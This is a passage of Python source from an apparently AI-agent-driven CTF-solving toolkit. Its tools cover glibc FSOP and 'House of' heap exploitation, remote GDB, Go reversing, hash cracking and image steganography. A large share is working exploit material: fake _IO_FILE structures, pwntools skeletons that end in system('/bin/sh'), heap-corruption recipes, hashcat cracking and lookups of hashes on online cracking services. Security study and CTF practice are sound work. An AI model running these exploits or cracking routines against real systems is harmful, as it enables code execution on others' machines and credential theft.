    if operation == "detect":
        code = f"""
import subprocess, re
bp = {repr(binary_path)}
lp = {repr(libc_path)}
if bp:
    r = subprocess.run(['checksec','--file='+bp], capture_output=True, text=True)
    print(r.stdout)
if lp:
    # Check libc version
    r = subprocess.run(['strings', lp], capture_output=True, text=True)
    ver = re.search(r'GLIBC (2\\.\\d+)', r.stdout)
    if ver:
        v = float(ver.group(1))
        print(f"glibc version: {{v}}")
        if v >= 2.35:
            print("[!] __free_hook REMOVED: use FSOP or large_bin_attack→mp_.tcache_bins")
        if v >= 2.24:
            print("[!] vtable pointer validation added: use _IO_str_vtable or _IO_wfile_jumps")
        if v >= 2.32:
            print("[!] pointer mangling for file ops (safe-linking applies)")
print()
print("FSOP attack surface:")
print("  1. Overwrite _IO_list_all → control _chain pointer → fake FILE struct")
print("  2. Trigger flushing: exit(), abort(), malloc error, fclose()")
print("  3. Fake FILE._flags: ~(_IO_NO_WRITES) | _IO_MAGIC (≈0xfbad0000)")
print("  4. _IO_write_base < _IO_write_ptr triggers __overflow virtual call")
print("  5. Vtable: use _IO_str_jumps or _IO_wfile_jumps (pass vtable check)")
print()
print("_IO_str_jumps.__overflow approach (glibc ≥2.24):")
print("  _flags = ~2 (0x...fffffffd)")
print("  _IO_write_base = 0")
print("  _IO_write_ptr = 1  (write_ptr > write_base triggers __overflow)")
print("  _IO_buf_base = '/bin/sh\\\\x00' address")
print("  vtable = &_IO_str_jumps  (bypasses vtable check)")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "fake_file":
        libc_base = int(params.get("libc_base", "0"), 16) if isinstance(params.get("libc_base","0"), str) else 0
        return (f"Fake _IO_FILE struct for FSOP (pwntools flat()):\n\n"
                f"from pwn import *\n"
                f"# libc base address — get from leak\n"
                f"libc_base = {hex(libc_base) if libc_base else 'LEAK_ADDR'}\n\n"
                f"# Method 1: _IO_str_jumps.__overflow → system('/bin/sh')\n"
                f"# Works on glibc 2.24+ (bypasses vtable check, _IO_str_jumps is allowed)\n"
                f"io_str_jumps  = libc_base + libc.sym._IO_str_jumps\n"
                f"system        = libc_base + libc.sym.system\n"
                f"binsh         = libc_base + next(libc.search(b'/bin/sh'))\n\n"
                f"fake_file = flat({{                   # _IO_FILE offsets\n"
                f"    0x00: b'/bin/sh\\x00' + b'\\x00'*7, # _flags (magic) / embed /bin/sh string\n"
                f"    0x28: binsh,                    # _IO_write_ptr > _IO_write_base\n"
                f"    0x38: binsh,                    # _IO_buf_base → becomes arg to system()\n"
                f"    0x40: binsh + 1,                # _IO_buf_end\n"
                f"    0xc0: 0,                        # _mode = 0 (must be <0 for __overflow path)\n"
                f"    0xd8: io_str_jumps - 0x20,      # vtable offset to hit __overflow\n"
                f"}})\n\n"
                f"# Method 2: _wide_data attack (glibc 2.35+ bypass)\n"
                f"# See operation='wide_data' for details\n\n"
                f"Offsets reference:\n" +
                "\n".join(f"  {k}: {hex(v)}" for k,v in IO_FILE_OFFSETS.items()))

    if operation == "wide_data":
        return f"[wide_data] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "_io_list_all":
        return f"[_io_list_all] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "skeleton":
        return (f"Full FSOP exploit skeleton (glibc 2.35+):\n\n"
                f"from pwn import *\n"
                f"context.arch = 'amd64'\n"
                f"elf  = ELF('{binary_path}')\n"
                f"libc = ELF('{libc_path or 'libc.so.6'}')\n"
                f"p    = process([elf.path])\n\n"
                f"# Step 1: Leak heap + libc (via UAF / format string / show chunk)\n"
                f"libc_base = LEAK - libc.sym.puts  # adjust to your leak\n"
                f"heap_base = HEAP_LEAK & ~0xfff\n\n"
                f"# Step 2: Large bin attack → _IO_list_all = &fake_file_on_heap\n"
                f"_IO_list_all = libc_base + libc.sym._IO_list_all\n"
                f"io_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps\n"
                f"system = libc_base + libc.sym.system\n"
                f"fake_file_addr = heap_base + OFFSET  # known heap offset\n\n"
                f"# Step 3: Build fake FILE with _wide_data attack\n"
                f"fake_wide_vtable_addr = fake_file_addr + 0x200\n"
                f"fake_wide_data_addr   = fake_file_addr + 0x100\n\n"
                f"fake_file = bytearray(0x300)\n"
                f"# /bin/sh at start (becomes arg to system via fp->_IO_buf_base)\n"
                f"fake_file[0:8]     = b'/bin/sh\\x00'\n"
                f"# _IO_write_ptr > _IO_write_base → triggers __overflow\n"
                f"flat_into(fake_file, {{0x20: 0, 0x28: 1}})\n"
                f"# _mode must be > 0 for _IO_wfile_overflow path\n"
                f"flat_into(fake_file, {{0xc0: 1}})\n"
                f"# _wide_data pointer\n"
                f"flat_into(fake_file, {{0xa0: fake_wide_data_addr}})\n"
                f"# vtable = _IO_wfile_jumps (passes validation)\n"
                f"flat_into(fake_file, {{0xd8: io_wfile_jumps}})\n"
                f"# fake _wide_data._wide_vtable at offset 0xe0\n"
                f"flat_into(fake_file, {{0x100 + 0xe0: fake_wide_vtable_addr}})\n"
                f"# fake vtable[7] = system (doallocate slot)\n"
                f"flat_into(fake_file, {{0x200 + 7*8: system}})\n\n"
                f"# Step 4: Write fake_file to heap, trigger exit()\n"
                f"write_primitive(fake_file_addr, bytes(fake_file))\n"
                f"large_bin_attack_target(_IO_list_all, fake_file_addr)\n"
                f"trigger_malloc_or_exit()\n"
                f"p.interactive()")

    return ("FSOP operations:\n"
            "  detect      — check glibc version, identify applicable technique\n"
            "  fake_file   — build fake _IO_FILE struct bytes\n"
            "  wide_data   — _wide_data vtable attack (glibc 2.35+)\n"
            "  _io_list_all— overwrite _IO_list_all chain\n"
            "  skeleton    — full pwntools exploit skeleton")


def tool_gdb_remote(host: str, port: int = 1234, binary_path: str = "",
                    operation: str = "connect", script: str = "",
                    find_addr: str = "", avoid_addrs: list = None,
                    timeout: int = 30) -> str:
    """Remote GDB debugging for challenges running gdbserver.
    Ops: connect (verify gdbserver is alive + get arch/regs),
    run_script (execute GDB script against remote target),
    pwntools_remote (pwntools GDB remote attach with pwndbg),
    angr_remote (angr exploration against remote binary snapshot),
    find_password (hook strcmp/memcmp via GDB + send candidates to extract comparison)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""
    avoid = avoid_addrs or []

    if operation == "connect":
        # Try both raw TCP probe and GDB handshake
        code = f"""
import socket, time
host, port = {repr(host)}, {port}
# Try raw TCP probe (gdbserver speaks GDB RSP)
try:
    s = socket.create_connection((host, port), timeout=5)
    s.send(b'+$qSupported:multiprocess+;swbreak+#c6')
    time.sleep(0.3)
    data = s.recv(1024)
    s.close()
    print(f"[gdbserver] Connected! Response: {{data[:80]}}")
    if b'PacketSize' in data:
        print("[gdbserver] GDB RSP handshake successful")
except Exception as ex:
    print(f"Connection failed: {{ex}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "run_script":
        if not script:
            return "Provide script= (GDB commands, one per line)"
        if not sp:
            return "Provide binary_path= for symbol resolution"
        gdb_script = f"""
set pagination off
set confirm off
target remote {host}:{port}
{script}
quit
"""
        tmp = f"/tmp/gdb_script_{int(time.time())}.gdb"
        with open(tmp, "w") as f: f.write(gdb_script)
        cmd = f"gdb -batch -x '{tmp}' '{sp}' 2>&1" if sp else f"gdb -batch -x '{tmp}' 2>&1"
        out = _shell(cmd, timeout=timeout)
        try: os.remove(tmp)
        except: pass
        return out

    if operation == "pwntools_remote":
        code = f"""
from pwn import *
import os
context.log_level = 'info'
{'context.binary = ELF(repr(sp))' if sp else '# no binary'}
gdb_script = {repr(script or "continue")}
try:
    # Connect to gdbserver via pwntools
    io = remote({repr(host)}, {port})
    print(f"Connected to {{host}}:{{port}}")
    # For gdbserver, we communicate via GDB RSP protocol
    # Send initial packet
    io.send(b'+$qSupported#37')
    resp = io.recv(timeout=3)
    print(f"RSP response: {{resp[:100]}}")
    io.close()
except Exception as ex:
    print(f"Error: {{ex}}")

# Alternative: spawn GDB and attach
print("\n--- GDB attach command ---")
print(f"gdb {repr(sp) if sp else ''} -ex 'target remote {host}:{port}' -ex {repr(script.splitlines()[0] if script else 'info registers')}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "find_password":
        """Hook comparison functions via GDB to extract what the binary compares against."""
        if not sp:
            return "Provide binary_path= for symbol resolution"
        gdb_script = f"""set pagination off
set confirm off
target remote {host}:{port}
# Hook strcmp, strncmp, memcmp
break strcmp
break strncmp
break memcmp
commands 1
  silent
  set $s1 = (char*)$rdi
  set $s2 = (char*)$rsi
  printf "strcmp: %%s vs %%s\n", $s1, $s2
  continue
end
commands 2
  silent
  printf "strncmp: %%s vs %%s\n", (char*)$rdi, (char*)$rsi
  continue
end
commands 3
  silent
  printf "memcmp: %%s vs %%s\n", (char*)$rdi, (char*)$rsi
  continue
end
continue
"""
        tmp = f"/tmp/gdb_hook_{int(time.time())}.gdb"
        with open(tmp, "w") as f: f.write(gdb_script)
        out = _shell(f"timeout {timeout} gdb -batch -x '{tmp}' '{sp}' 2>&1", timeout=timeout+5)
        try: os.remove(tmp)
        except: pass
        return out

    if operation == "angr_remote":
        if not sp or not find_addr:
            return "Provide binary_path= and find_addr= for angr exploration"
        code = f"""
import angr, claripy
proj = angr.Project({repr(sp)}, load_options={{'auto_load_libs': False}})
find = {int(find_addr, 16) if find_addr.startswith('0x') else int(find_addr, 16)}
avoid = {[int(a, 16) if a.startswith('0x') else int(a, 16) for a in avoid]}
state = proj.factory.entry_state()
sm = proj.factory.simulation_manager(state)
sm.explore(find=find, avoid=avoid)
if sm.found:
    s = sm.found[0]
    stdin = s.posix.dumps(0)
    print(f"[angr] Found! stdin = {{repr(stdin)}}")
else:
    print("[angr] No path found")
"""
        return tool_execute_python(code, timeout=120)

    return "Operations: connect, run_script, pwntools_remote, find_password, angr_remote"


def tool_go_rev(binary_path: str, operation: str = "analyze",
                 output_dir: str = "") -> str:
    """Go binary reversing: analyze (version, build info, goroutines), symbols (recover stripped symbols via GoReSym),
    functions (list all Go functions), strings (Go string table), types (recover type info),
    pcln (parse pclntab for function names even when stripped)."""

    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    od = output_dir or f"/tmp/go_rev_{int(time.time())}"

    if operation == "analyze":
        return _shell(f"strings '{sp}' | grep -E 'go[0-9]+\\.[0-9]+|/usr/local/go|GOOS|GOARCH' | head -10 && "
                     f"echo '--- Build info ---' && "
                     f"go version '{sp}' 2>/dev/null || strings '{sp}' | grep 'go1\\.' | head -5 && "
                     f"echo '--- Suspicious strings ---' && "
                     f"strings '{sp}' | grep -iE 'flag|ctf|secret|key|password|check|verify' | head -20 && "
                     f"echo '--- ELF info ---' && "
                     f"readelf -h '{sp}' 2>/dev/null | grep -E 'Type|Machine|Entry' | head -5",
                     timeout=20)

    if operation == "symbols":
        code = f"""
import subprocess, os
sp = {repr(sp)}
od = {repr(od)}
os.makedirs(od, exist_ok=True)

# Try GoReSym first (best Go symbol recovery)
r = subprocess.run(['GoReSym', '-t', '-d', '-m', sp],
                   capture_output=True, text=True, timeout=60)
if r.returncode == 0:
    out_file = f'{{od}}/goresym.json'
    with open(out_file, 'w') as f: f.write(r.stdout)
    print(f"GoReSym output: {{out_file}}")
    # Print function names
    import json
    try:
        data = json.loads(r.stdout)
        fns = data.get('UserFunctions', []) + data.get('StdFunctions', [])
        print(f"Recovered {{len(fns)}} functions:")
        for fn in fns[:30]:
            print(f"  0x{{fn.get('Start','?'):x}}: {{fn.get('FullName','?')}}")
    except: print(r.stdout[:2000])
else:
    print("GoReSym not found. Install: go install github.com/mandiant/GoReSym@latest")
    print("Trying pclntab parse...")
    # Parse pclntab manually
    r2 = subprocess.run(['strings', '-n', '8', sp], capture_output=True, text=True, timeout=15)
    go_fns = [s for s in r2.stdout.split('\\n')
              if s.startswith('main.') or s.startswith('github.com/') or s.startswith('golang.org/')]
    print(f"pclntab strings ({{len(go_fns)}}):")
    for fn in go_fns[:40]: print(f"  {{fn}}")
"""
        return tool_execute_python(code, timeout=70)

    if operation == "functions":
        code = f"""
import subprocess, re
sp = {repr(sp)}

# Method 1: nm
r = subprocess.run(['nm', '-n', sp], capture_output=True, text=True, timeout=15)
go_fns = [l for l in r.stdout.split('\\n') if ' T ' in l or ' t ' in l]
if go_fns:
    print(f"Functions (nm): {{len(go_fns)}}")
    for fn in go_fns[:40]: print(f"  {{fn.strip()}}")
else:
    # Method 2: Parse pclntab via radare2
    r2 = subprocess.run(['r2', '-q', '-c', 'aaa; afll', sp],
                        capture_output=True, text=True, timeout=60)
    print(f"r2 function list:")
    for l in r2.stdout.split('\\n')[:40]: print(l)
"""
        return tool_execute_python(code, timeout=70)

    if operation == "pcln":
        code = f"""
import subprocess, struct, re
sp = {repr(sp)}

# Parse pclntab to recover function names even in stripped binary
with open(sp, 'rb') as f:
    data = f.read()

# Find pclntab magic
MAGIC_1_20 = b'\\xf1\\xff\\xff\\xff\\x00\\x00'
MAGIC_1_18 = b'\\xf0\\xff\\xff\\xff\\x00\\x00'
MAGIC_1_16 = b'\\xfb\\xff\\xff\\xff\\x00\\x00'
MAGIC_OLD  = b'\\xfb\\xff\\xff\\xff'

names = []
for magic in [MAGIC_1_20, MAGIC_1_18, MAGIC_1_16, MAGIC_OLD]:
    pos = data.find(magic)
    if pos != -1:
        print(f"Found pclntab at offset 0x{{pos:x}} (magic: {{magic.hex()}})")
        # Extract function names from pclntab
        # This is simplified — proper parsing needs architecture awareness
        chunk = data[pos:pos+1024*1024]
        # Find null-terminated strings that look like Go function names
        for m in re.finditer(b'[\\x20-\\x7e]{{10,200}}\\x00', chunk):
            s = m.group().rstrip(b'\\x00').decode(errors='replace')
            if '.' in s and any(c.isupper() for c in s) and '/' in s or s.startswith('main.'):
                names.append(s)
        break

print(f"Recovered {{len(names)}} function names from pclntab:")
for n in sorted(set(names))[:50]: print(f"  {{n}}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "strings":
        return _shell(f"strings -n 6 '{sp}' | grep -E '^[a-z]{{2,}}/|^main\\.|^github\\.com|^golang\\.org' | head -50 && "
                     f"echo '--- All strings (filtered) ---' && "
                     f"strings '{sp}' | grep -vE '^\\s*$|^\\.' | head -80",
                     timeout=15)

    return "Operations: analyze, symbols, functions, pcln, strings, types"


def tool_hash_crack(hash_value: str, operation: str = "auto",
                    wordlist: str = "rockyou", hash_type: str = "") -> str:
    """Identify and crack hashes via hashcat wordlist/bruteforce + online API fallback.
    Ops: auto (identify then try all), identify (type detection only),
    wordlist (hashcat -a 0 rockyou.txt), bruteforce (hashcat -a 3 short masks),
    online_lookup (hashes.com / crackstation HTTP query)."""

    hv = hash_value.strip()

    # ── identify hash type ────────────────────────────────────────────────────
    def _identify(h):
        l = len(h)
        hints = []
        if re.fullmatch(r'[0-9a-fA-F]{32}', h):  hints.append("MD5 (hashcat -m 0)")
        if re.fullmatch(r'[0-9a-fA-F]{40}', h):  hints.append("SHA1 (hashcat -m 100)")
        if re.fullmatch(r'[0-9a-fA-F]{56}', h):  hints.append("SHA224 (hashcat -m 1300)")
        if re.fullmatch(r'[0-9a-fA-F]{64}', h):  hints.append("SHA256 (hashcat -m 1400)")
        if re.fullmatch(r'[0-9a-fA-F]{96}', h):  hints.append("SHA384 (hashcat -m 10800)")
        if re.fullmatch(r'[0-9a-fA-F]{128}', h): hints.append("SHA512 (hashcat -m 1700)")
        if re.fullmatch(r'\$2[aby]\$.{56}', h):   hints.append("bcrypt (hashcat -m 3200)")
        if re.fullmatch(r'[0-9a-fA-F]{32}:[0-9a-fA-F]{32}', h): hints.append("NTLM (hashcat -m 1000)")
        if h.startswith('$6$'):                   hints.append("sha512crypt (hashcat -m 1800)")
        if h.startswith('$5$'):                   hints.append("sha256crypt (hashcat -m 7400)")
        if h.startswith('$1$'):                   hints.append("md5crypt (hashcat -m 500)")
        if not hints:                             hints.append(f"Unknown — length {l}")
        return "; ".join(hints)

    if operation == "identify":
        return _identify(hv)

    # ── online lookup ─────────────────────────────────────────────────────────
    def _online(h):
        results = []
        try:
            import urllib.request
            # CrackStation
            req = urllib.request.Request(
                "https://crackstation.net/api/",
                data=urllib.parse.urlencode({"hash": h, "format": "json"}).encode(),
                headers={"User-Agent": "CTF-Solver/1.0",
                         "Content-Type": "application/x-www-form-urlencoded"})
            with urllib.request.urlopen(req, timeout=10) as r:
                j = json.loads(r.read())
            if isinstance(j, list) and j and j[0].get("cracked"):
                results.append(f"[CrackStation] {j[0]['hash']} => {j[0]['password']}")
        except Exception as ex:
            results.append(f"[CrackStation] error: {ex}")
        try:
            req2 = urllib.request.Request(
                f"https://hashes.com/en/api/identifyandsearch?hashtext={urllib.parse.quote(h)}",
                headers={"User-Agent": "CTF-Solver/1.0"})
            with urllib.request.urlopen(req2, timeout=10) as r:
                j2 = json.loads(r.read())
            if j2.get("found"):
                results.append(f"[hashes.com] {h} => {j2.get('plaintext','?')}")
        except Exception as ex:
            results.append(f"[hashes.com] error: {ex}")
        return "\n".join(results) if results else "No online result"

    if operation == "online_lookup":
        return _online(hv)

    # ── hashcat wordlist ──────────────────────────────────────────────────────
    def _hashcat(h, ht, mode):
        # map friendly names to hashcat -m codes
        type_map = {"md5":"0","sha1":"100","sha224":"1300","sha256":"1400",
                    "sha384":"10800","sha512":"1700","ntlm":"1000","bcrypt":"3200",
                    "md5crypt":"500","sha512crypt":"1800","sha256crypt":"7400"}
        if ht in type_map:
            m_flag = type_map[ht]
        else:
            # auto-detect
            l = len(h)
            m_flag = {32:"0",40:"100",64:"1400",128:"1700"}.get(l,"0")

        wl_paths = ["/usr/share/wordlists/rockyou.txt",
                    "/usr/share/wordlists/rockyou.txt.gz",
                    "/opt/rockyou.txt", "/tmp/rockyou.txt"]
        wl = next((p for p in wl_paths if os.path.exists(p)), "")

        tmp_hash = f"/tmp/hc_hash_{int(time.time())}.txt"
        tmp_out  = f"/tmp/hc_out_{int(time.time())}.txt"
        try:
            with open(tmp_hash, "w") as f: f.write(h + "\n")
            if mode == "wordlist":
                if not wl:
                    return "rockyou.txt not found — trying online lookup\n" + _online(h)
                cmd = f"hashcat -m {m_flag} -a 0 '{tmp_hash}' '{wl}' --potfile-disable -o '{tmp_out}' --quiet 2>&1; cat '{tmp_out}' 2>/dev/null"
            else:  # bruteforce masks
                masks = "?a?a?a?a?a?a?a?a"
                cmd = (f"hashcat -m {m_flag} -a 3 '{tmp_hash}' {masks} "
                       f"--potfile-disable -o '{tmp_out}' --quiet 2>&1; cat '{tmp_out}' 2>/dev/null")
            out = _shell(cmd, timeout=180)
            if os.path.exists(tmp_out):
                cracked = open(tmp_out).read().strip()
                if cracked:
                    parts = cracked.split(":")
                    pw = ":".join(parts[1:]) if len(parts) > 1 else cracked
                    return f"[CRACKED] {h} => {pw}"
            return out or "Not cracked by hashcat"
        finally:
            for f in (tmp_hash, tmp_out):
                try: os.remove(f)
                except: pass

    if operation == "wordlist":
        ht = hash_type or ""
        return _hashcat(hv, ht, "wordlist")

    if operation == "bruteforce":
        ht = hash_type or ""
        return _hashcat(hv, ht, "bruteforce")

    # ── auto: identify → online → wordlist ───────────────────────────────────
    identified = _identify(hv)
    log("sys", f"[hash_crack] identified: {identified}", "dim")
    online_result = _online(hv)
    if "=>" in online_result:
        return f"Type: {identified}\n{online_result}"
    hc_result = _hashcat(hv, hash_type, "wordlist")
    return f"Type: {identified}\nOnline: {online_result}\nHashcat: {hc_result}"


def tool_house_of_exploit(binary_path: str, technique: str = "detect",
                           libc_path: str = "", libc_version: str = "",
                           target_addr: str = "0", cmd: str = "/bin/sh") -> str:
    """House of * heap exploitation techniques for glibc ≥2.31.
    Techniques: detect, orange (unsorted_bin→__malloc_hook), force (fastbin→tcache),
    spirit (large_bin→AAW), einherjar (consolidation→overlap), lore (large_bin attack v2),
    tangerine (tcache stash), posion_null_byte, off_by_one."""

    if technique == "detect":
        code = f"""
import subprocess, re
bp = {repr(binary_path)}
r = subprocess.run(['checksec','--file='+bp], capture_output=True, text=True)
print("Protections:\\n" + r.stdout)
# Determine libc version
libc = {repr(libc_path)} or {repr(libc_version)}
if libc:
    if 'libc' in libc:
        ver_match = re.search(r'(2\\.\\d+)', libc)
        ver = ver_match.group(1) if ver_match else '?'
    else:
        ver = libc
    print(f"\\nLibc version: {{ver}}")
    major_minor = float(ver) if ver != '?' else 0
    print("\\nApplicable House of * techniques:")
    if major_minor < 2.27:
        print("  House of Orange: __malloc_hook via unsorted bin (classic)")
        print("  House of Force: top chunk size overwrite → arbitrary malloc")
        print("  House of Einherjar: off-by-null → consolidation")
    if major_minor >= 2.27 and major_minor < 2.32:
        print("  House of Force: still works (no tcache size check)")
        print("  House of Tangerine: tcache stash unlink+ attack")
        print("  House of Lore: smallbin bk pointer overwrite")
    if major_minor >= 2.32:
        print("  House of Spirit: free fake chunk → tcache")
        print("  House of Lore v2: large bin attack → anywhere write")
        print("  Poison null byte: off-by-null consolidation (still possible)")
        print("  tcache house of spirit (tcache_entry.key bypass needed)")
    print("\\nCurrent meta: glibc ≥2.35 removed __free_hook/__malloc_hook")
    print("Use: _IO_list_all (FSOP) or large_bin_attack → mp_.tcache_bins overwrite")
else:
    print("Provide libc_path or libc_version to get specific technique recommendations")
"""
        return tool_execute_python(code, timeout=15)

    SKELETONS = {
        "orange": '''# House of Orange — glibc < 2.27, __malloc_hook via unsorted bin AW
# Requires: heap overflow into top chunk size field, leak heap+libc
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")
p = process([elf.path])

# Step 1: shrink top chunk size to 0x21 (must be page-aligned after + size)
# overwrite top_chunk->size with (valid_size & ~PREV_INUSE) that crosses page boundary
# e.g., top_chunk at 0x...f18, write 0xd01 as size → next malloc > size triggers sysmalloc → frees old top

# Step 2: old top lands in unsorted bin as 0xd00 chunk
# Step 3: leak libc via malloc → print unsorted bin chunk (bk/fd = main_arena offsets)

# Step 4: abuse House of Orange — overwrite _IO_list_all via unsorted bin attack
# Set fake FILE struct with vtable → __overflow → system("/bin/sh")
# (pre-2.24 vtable check)

io_list_all = libc.sym._IO_list_all
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh"))

fake_file  = flat(
    p64(0), p64(0x61),        # chunk header (smallbin size 0x60)
    p64(0), p64(io_list_all - 0x10),   # fd=0, bk=_IO_list_all-0x10 (unsorted attack)
    b"\\x00"*8, p64(2),         # _IO_write_base, _IO_write_ptr triggers fp->_mode < 0
    b"\\x00"*0x20,
    p64(system),              # _IO_buf_base (used as argument)
    b"\\x00"*8,
    p64(binsh),               # _IO_save_end
    # ... vtable pointer at offset 0xd8 pointing to fake vtable
)
# Trigger: malloc → abort → _IO_flush_all_lockp → __overflow on fake FILE''',

        "force": '''# House of Force — arbitrary malloc to any address via top chunk overwrite
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")
p = process([elf.path])

# Requires: overflow into top chunk size field, control malloc size

# Step 1: overwrite top chunk size with 0xffffffffffffffff
# top_chunk_addr + 0x10 (data area) = current top
# payload = b"A"*overflow_amount + p64(0xffffffffffffffff)

# Step 2: malloc((target_addr - top_addr - 0x20) & (2**64-1))
# This wraps top chunk to target_addr

# Step 3: next malloc returns target_addr
# overwrite __malloc_hook = one_gadget

target = {target_addr}  # e.g. libc.sym.__malloc_hook
''',

        "spirit": '''# House of Spirit — free fake chunk into tcache/fastbin
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")

# Requires: control over a pointer fed to free(), control fake chunk metadata nearby
# Fake chunk: size field, prev_size of NEXT chunk (for fastbin: just size; for tcache: size + key)

fake_chunk_addr = {target_addr}  # address of fake chunk
size = 0x40  # pick any tcache size

# Layout fake chunk:
# [0x00] prev_size (any)
# [0x08] size = 0x41 (0x40 + PREV_INUSE)  ← write this
# [0x10] fd (tcache: next ptr)
# [0x18] key (tcache key, needs to be 0 or valid tcache addr to avoid abort)

# After free(fake_chunk_addr + 0x10):
# tcache[size] = fake_chunk_addr + 0x10
# malloc(size-0x10) → returns fake_chunk_addr + 0x10 → arbitrary write
''',

        "lore": '''# House of Lore v2 (glibc ≥2.32) — large bin attack → anywhere write
# Requires: chunk in large bin, overflow into bk_nextsize
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")

# Large bin attack mechanism:
# When a chunk is inserted into large bin:
#   victim->bk_nextsize->fd_nextsize = victim   (write victim_addr → target-0x20+0x18 offset)
# So: set victim->bk_nextsize = target - 0x20

# Targets on glibc ≥2.35 (no __free_hook):
target_candidates = [
    "mp_.tcache_bins",       # control tcache allocation size range
    "_IO_list_all",          # FSOP → RCE (combine with tool_fsop)
    "tls_dtor_list",         # thread-local destructor list
    "global_max_fast",       # expand fastbin range
]

# Practical skeleton:
# 1. Allocate large chunk A (> 1024 bytes), free → large bin
# 2. Overflow: write A->bk_nextsize = target - 0x20
# 3. Allocate same-size chunk B (triggers large bin insertion of B, attacks target)
# 4. target now contains pointer to B → use as write primitive
''',

        "einherjar": '''# House of Einherjar — off-by-null → controlled consolidation → chunk overlap
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")

# Requires: off-by-null (1 byte overflow writing 0x00 into next chunk's size)
# Effect: clears PREV_INUSE bit → triggers backward consolidation with fake prev chunk

# Step 1: Create fake prev chunk in controlled region
# fake_chunk at heap_base + offset, size must equal (real_prev_size)
# fake_chunk->fd, bk must bypass unlink macro: fd->bk == fake_chunk, bk->fd == fake_chunk

# Step 2: Set up target chunk B after fake gap
# Set B->prev_size = (B_addr - fake_chunk_addr)
# Overflow B-1 to clear B->PREV_INUSE

# Step 3: free(B) → consolidates back with fake_chunk → overlapping chunk
# Use overlapping chunk to overwrite live allocation (fd/bk pointers)
''',
    }

    if technique in SKELETONS:
        skeleton = SKELETONS[technique].replace("{bp}", binary_path).replace("{lp}", libc_path).replace("{target_addr}", target_addr)
        return f"=== House of {technique.capitalize()} skeleton ===\n\n{skeleton}\n\nNext: ghidra_decompile to find UAF/overflow primitive, libc_lookup for offsets, heap_analysis to verify chunk layout"

    if technique == "poison_null_byte":
        return ("Poison Null Byte (off-by-null) technique:\n\n"
                "Applicable: glibc ≤2.28 (clear PREV_INUSE) or controlled prev_size write\n\n"
                "Mechanism:\n"
                "1. Allocate A (0x100), B (0x200), C (any) — B is victim\n"
                "2. Overflow last byte of A → B->size = 0x200 (clears PREV_INUSE bit)\n"
                "   Also need: B->prev_size must == sizeof(A) for consolidation math\n"
                "3. Free B → glibc backward-consolidates with fake A (thinks it's free)\n"
                "4. Result: overlapping chunk spans A+B allocation\n"
                "5. Malloc from overlapping region → overwrite B's live metadata\n\n"
                "glibc 2.29+ mitigation: checks prev_size matches chunk header size\n"
                "Bypass: control prev_size via another overflow / use House of Einherjar instead")

    if technique == "off_by_one":
        return ("Off-By-One exploitation paths:\n\n"
                "Target: next chunk's size field (1 byte write)\n\n"
                "Path 1 (expand chunk):\n"
                "  Write 0x?1 → 0x?1+0x?0 → expanded chunk overlaps next allocation\n\n"
                "Path 2 (shrink chunk, poison null byte):\n"
                "  Write 0x00 → clears PREV_INUSE → House of Einherjar\n\n"
                "Path 3 (change size to exact tcache size):\n"
                "  Turn 0x41 → 0x31 → chunk gets freed into wrong tcache bin → type confusion\n\n"
                "Finding off-by-one:\n"
                "  angr_solve with find=crash_addr, stdin_len=N\n"
                "  afl_fuzz with short inputs, look for heap corruption crashes\n"
                "  Source audit: strcpy/sprintf/gets without size check")

    return ("House of * techniques:\n"
            "  detect        — identify applicable technique for your glibc version\n"
            "  orange        — unsorted bin → __malloc_hook (glibc <2.27)\n"
            "  force         — top chunk overwrite → arbitrary malloc\n"
            "  spirit        — free fake chunk into tcache\n"
            "  lore          — large bin bk_nextsize attack → arbitrary write\n"
            "  einherjar     — off-by-null → consolidation overlap\n"
            "  poison_null_byte — off-by-null → PREV_INUSE manipulation\n"
            "  off_by_one    — generic off-by-one exploitation paths")


def tool_image_steg_advanced(image_path: str = "", operation: str = "auto",
                              channel: str = "all", bit_plane: int = 0,
                              output_path: str = "") -> str:
    """Advanced image steganography analysis beyond basic LSB/zsteg.
    Ops: auto (run all checks), msb (most-significant-bit extraction),
    color_planes (extract R/G/B/A channels separately to PNGs),
    bit_plane_extract (extract specific bit plane 0-7 from each channel),
    fourier (FFT magnitude spectrum — reveals frequency-domain hiding),
    palette_steg (analyze PNG palette/indexed color for hidden data),
    alpha_extract (dump alpha channel bytes — often used for steg),
    outguess (run outguess JPEG steg detector),
    stegsolve (PIL-based plane analysis for all 32 bit/channel combos),
    metadata_deep (exiftool -all= strips + exiv2 + identify -verbose)."""

    sp = (_w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path) if image_path else ""
    op = output_path or f"/tmp/steg_out_{int(time.time())}"
    _shell(f"mkdir -p '{op}'")

    if operation == "auto":
        results = []
        # 1. zsteg full scan
        results.append("=== zsteg full scan ===")
        results.append(_shell(f"zsteg -a '{sp}' 2>&1 | head -60", timeout=30))
        # 2. steghide with empty password
        results.append("\n=== steghide (no password) ===")
        results.append(_shell(f"steghide extract -sf '{sp}' -p '' -f -o '{op}/steghide_out' 2>&1 && cat '{op}/steghide_out' 2>/dev/null | head -20", timeout=10))
        # 3. MSB plane
        results.append("\n=== MSB extraction ===")
        results.append(tool_image_steg_advanced(sp, "msb"))
        # 4. Alpha channel
        results.append("\n=== Alpha channel ===")
        results.append(tool_image_steg_advanced(sp, "alpha_extract", output_path=op))
        # 5. outguess
        results.append("\n=== outguess ===")
        results.append(_shell(f"outguess -r '{sp}' '{op}/outguess_out' 2>&1 && cat '{op}/outguess_out' 2>/dev/null", timeout=15))
        # 6. strings on raw pixel data
        results.append("\n=== strings in pixel data ===")
        results.append(tool_image_steg_advanced(sp, "stegsolve"))
        return "\n".join(results)

    if operation == "msb":
        code = f"""
from PIL import Image
import numpy as np
img = Image.open({repr(sp)}).convert("RGB")
